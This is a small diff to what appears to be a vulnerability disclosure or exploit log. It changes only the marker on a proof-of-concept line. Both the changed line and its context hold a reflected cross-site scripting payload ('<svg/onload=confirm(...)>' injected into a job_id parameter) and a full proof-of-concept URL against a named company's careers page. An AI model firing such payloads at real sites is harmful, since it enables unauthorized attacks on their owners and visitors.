@@ -215,7 +215,7 @@ Table: wp_users
 
 [+] Payload: <input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">
 
-[*] POC: http://www.blueboxinfosoft.com/careers/job.php?id=<input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">
+[+] POC: http://www.blueboxinfosoft.com/careers/job.php?id=<input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">
 
 A2 Hosting, Inc.
 
